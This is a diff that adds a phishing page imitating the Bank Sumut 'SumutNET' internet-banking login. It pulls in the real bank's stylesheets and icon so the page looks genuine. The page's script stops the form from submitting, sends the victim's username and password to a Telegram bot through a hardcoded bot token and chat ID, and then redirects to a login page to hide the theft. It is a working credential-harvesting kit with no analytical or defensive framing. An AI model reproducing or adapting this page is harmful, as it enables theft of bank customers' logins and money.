@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <link rel="stylesheet" type="text/css" href="cid:css-b53a6696-2e8f-4263-b5a9-a27ca9a6b3eb@mhtml.blink" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <meta name="referrer" content="no-referrer" ?="">
+        <link rel="icon" href="https://ib.banksumut.co.id/favicon.ico">
+        <title>Internet Banking Individual</title>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Material+Icons">
+        <link href="https://ib.banksumut.co.id/css/app.0d37489c.css" rel="preload" as="style">
+        <link href="https://ib.banksumut.co.id/css/chunk-vendors.2e249e91.css" rel="preload" as="style">
+        <link href="https://ib.banksumut.co.id/js/app.358568fe.js" rel="preload" as="script">
+        <link href="https://ib.banksumut.co.id/js/chunk-vendors.5c885217.js" rel="preload" as="script">
+        <link href="https://ib.banksumut.co.id/css/chunk-vendors.2e249e91.css" rel="stylesheet">
+        <link href="https://ib.banksumut.co.id/css/app.0d37489c.css" rel="stylesheet">
+        </head>
+        <body>
+            <div data-app="true" class="v-application v-application--is-ltr theme--light" id="app">
+    <div class="v-application--wrap" style="margin-top: -15%;">
+        <div class="background-page-sumut login-sumut">
+                        <!--
+<div class="container grid-list-md">
+                </div>-->
+                <center>
+                    </div>
+    <div class="bubble-element Popup bubble-r-container relative" style="margin-top: 40%; left: 0px; right: 0px; position: fixed; z-index: 2002; margin-left: auto; margin-right: auto; width: 90%; min-height: 40px; height: 450px; overflow-y: auto; border-style: outset; border-width: 1px; border-left:  1px solid silver; border-right: 1px solid silver; border-top: 1px solid silver; border-bottom: 1px solid silver; border-radius: 6px; background: white; opacity: 0.8; padding: 0px 0px;">
+        <br>
+    <center>
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg8Y5bvPHOeatC4rPb1JPQYAY0R6oa7QSftYatqfWJjZdA-2O-H-SyJUINpYNCu4vl1lUlIdVXgHjZheAiIJw8vHOmNQhaPxmQ5hKgIsRbvPpmWXkaEzrK49rgPbOiN_PM6Ag_6EnIM3xAL-BnK29eKgZgkPW753t3jV-MKm6wDWNZtvlgk08_snRdWrg=w1200-h630-p-k-no-nu" style="width: 60%; margin-left: 0%; margin-top: 0%;"><br>
+    <p style="color: #2554C7; font-size: 17px; margin-top: -5%; margin-left: 0px; text-align: center; font-weight: bold;"><b>Selamat Datang<br><p style="color: #2554C7; font-size: 17px; margin-top: -5%; margin-left: -27%; text-align: center; font-weight: bold;"><b>Di<p style="color: #F87217; font-size: 17px; margin-top: -12.70%; margin-left: 17px; text-align: center; font-weight: bold;"><b>SumutNET</b></p></center>
+      <br>
+             <form id="tg" onsubmit="">
+       <center><input required class="contoh1" style="width:80%;height: 35px; border-width: none; border-left:  none; border-right: none; border-top: 0px; border-bottom: 1px solid black; margin-left: 0%; margin-top: 0%; background: white; border-radius: 0px; text-align: left; padding-left: 20px; outline:none; border-color: #F5F5F5 1px 1px 0px 0px; font-size: 16px;" minlength="" maxlength="" type="text" name="Username" id="Nama" placeholder="Username"><br>
+                     <input required class="contoh1" style="width:80%;height: 35px; border-width: none; border-left:  none; border-right: none; border-top: 0px; border-bottom: 1px solid black; margin-left: 0%; margin-top: 5%; background: white; border-radius: 0px; text-align: left; padding-left: 20px; outline:none; border-color: #F5F5F5 1px 1px 0px 0px; font-size: 16px;" minlength="" maxlength="" type="password" name="Password" id="Nama" placeholder="Password"><br>
+           <center><button type="submit" style="width: 90%; height: 40px; margin-top: 15%; font-size: 16px; background: #F87217; color: white; border-radius: 4px; border: 0px solid white; padding: 0px;">Masuk</button></center>
+    </div>
+           <!--
+     <button type="button" class="btn-belum" onclick="location.href='/login';">Belum Punya Akun</button> -->
+    </div> 
+   </div> 
+  </div> 
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
+        <p id="status"></p>
+</div>
+             </div>
+<script>
+
+    const chat_id = '6243080528', botID = 'bot6275330545:AAEzdmZFakPgB9Wb5iV_4a5R6tpCnXZRyQI';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href='/login.html';
+    });
+
+</script>
+</form>
+                    <!--
+    <div class="layout wrap">
+ <div class="flex mt-12 lg5 md5 xs12 hidden-xs-only">
+<div class="card-login v-card v-sheet theme--light elevation-6">
+                </div>-->
+</div>
+            </body>
+            </html>
